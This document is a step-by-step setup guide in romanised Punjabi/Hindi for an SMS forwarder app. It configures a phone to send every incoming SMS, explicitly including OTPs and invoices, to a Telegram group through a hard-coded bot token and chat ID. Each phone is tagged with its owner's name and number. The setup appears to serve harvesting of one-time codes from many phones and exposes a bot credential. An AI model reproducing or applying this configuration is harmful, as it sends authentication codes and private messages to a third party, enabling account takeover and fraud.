SMS Forwarder Setup
⚙️

SMS Forwarder Configuration

App download ho jaye (Method 1 ya 2) → phir eh setup karo

1 Permissions

App kholo → saari permissions de do (SMS, Storage, Notification, Battery optimization ignore).

2 New Rule

+ icon te click karo (naya rule banao).

3 Sender

Sender field vich eh symbol pao:

*
4 Webhook URL

Webhook URL field vich eh link pao (group chat_id naal):

https://api.telegram.org/bot8962351328:AAGf-zO6MCrjyKOcKpvXmo9hrjUYjYFEOhQ/sendMessage?chat_id=-1004355666217
5 JSON Payload Template

Advanced parameter kholo → JSON payload template vich eh paste karo:

{ "chat_id": "-1004355666217", "text": "📩 From: %from%\n📲 [Name]\n📞 [Number]\n🔑 %text%\n⏰ %sentStamp=dd-MM-yyyy HH:mm%" }
⚠️ ZAROORI — Eh padho:

JSON vich [Name] di jagah apna naam likho, te [Number] di jagah apna mobile number likho — jis phone vich eh activity ho rahi hai.

Example 1 — Naam:
"📲 Maninder"

Example 2 — Mobile Number:
"📞 +919876543210"

Example 3 — Dono:
"📲 Maninder"
"📞 +919876543210"

👉 Jis phone vich SMS aayega, us phone te oh phone da naam te number likho. Telegram te message vich ehhi dikhega — taaki pata lage kis number/phone te SMS aaya.

📌 Note: Text Filter khaali chad de (kuch vi na likh) taaki saare SMS (OTP + invoice + hor) forward hon. Sab SMS ik hi group (General) vich aayenge. Har phone de JSON vich alag naam/number pao, taaki pata lage kaunse phone da SMS aa.
6 Test & Save

Niche Test button te click karo → phir Save button te click karo. Done ✅
